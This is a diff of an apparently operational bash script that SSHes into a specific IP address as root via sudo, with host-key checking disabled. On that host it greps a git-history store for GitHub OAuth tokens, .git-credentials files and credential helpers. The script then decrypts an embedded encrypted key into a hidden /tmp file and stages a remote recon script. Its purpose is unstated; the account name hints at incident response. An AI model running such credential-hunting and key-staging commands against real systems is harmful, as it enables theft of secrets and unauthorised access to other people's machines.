@@ -1,6 +1,13 @@
-echo "=== k221 delivery v3 ==="
+echo "=== githist gho grep ==="
+timeout 60 ssh -o StrictHostKeyChecking=no -i /root/.rxk radix-irprobe@85.234.79.62 'sudo bash -s' <<'PAYLOAD'
+grep -rl "gho_" /opt/githist/ 2>/dev/null | head -10
+echo "-- credential helpers --"
+grep -rl "credential" /opt/githist/rx/*/.git/config 2>/dev/null | head -5
+find /opt/githist -name ".git-credentials" 2>/dev/null | head -5
+grep -rE "helper" /opt/githist/rx/*/.git/config 2>/dev/null | head -5
+PAYLOAD
+echo "=== k221 delivery v4 ==="
 P=$(tr -d '[:space:]' < /root/.rxk | sha256sum | awk '{print $1}')
-echo "box-passphrase: $P"
 cat > /tmp/.k221.b64 <<'K64'
 U2FsdGVkX19IeIEXjMegVOi3ABx4Fbjx1AIW7d/GK/nJCd28VdD6CGs/D5/Qmkmv4SYYWQGpshmE
 9xnLB6vd24ZqfRnfp70p6IDa4u1E9TVTTX+kXQWg4L+53r4J8iAqPhM/UUdmcxdX8LMPnlWedP0s
@@ -11,7 +18,7 @@ rKiQ3rgtkK1DDjD2pd7CSHGBIgDVSKSO14ErSgO8WyXI8/Sa3RQYawXcWkwnElrUOu6y+TSP+5WW
 378EKTaczWZ7reEXp5D6O2XIWiL6wQ4Rw+6H8gv8irfuIZtm/sl88YqShh/SlC39D4Ms335GmjRZ
 8VqiTbau3XMxVN641e50zNMXeD72Wx4yN/Rn7lyTGCzNgFe70aTJWZ+Y+q3auQSKLw==
 K64
-openssl enc -d -a -A -aes-256-cbc -pbkdf2 -md sha256 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>&1 && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL3"
+openssl enc -d -a -aes-256-cbc -pbkdf2 -md sha256 -pass pass:$P -in /tmp/.k221.b64 -out /tmp/.k221 2>&1 && chmod 600 /tmp/.k221 && head -1 /tmp/.k221 || echo "DECRYPT-FAIL4"
 echo "=== 221 recon ==="
 cat > /tmp/recon221.sh <<'RSH'
 #!/bin/bash
@@ -40,4 +47,4 @@ if [ -s /tmp/.k221 ]; then
 else
   echo "no key, skip"
 fi
-echo "=== B15DONE ==="
+echo "=== B16DONE ==="
